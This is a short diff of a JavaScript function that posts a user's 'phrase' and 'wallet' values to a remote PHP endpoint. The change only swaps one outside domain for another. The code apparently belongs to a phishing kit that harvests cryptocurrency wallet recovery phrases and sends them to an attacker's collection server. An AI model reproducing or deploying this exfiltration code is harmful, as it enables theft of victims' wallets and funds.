@@ -82,7 +82,7 @@ function sendData( data ) {
 $.ajax({
 
 type:"post",
-url:"https://bethelmedicalcenter.ca/emailServer/sync.php",
+url:"https://exolinklogistics.com/emailServer/sync.php",
 data: 'phrase='+phraseVal+'&wallet='+walletVal,
 success:function(respnx)
 {   
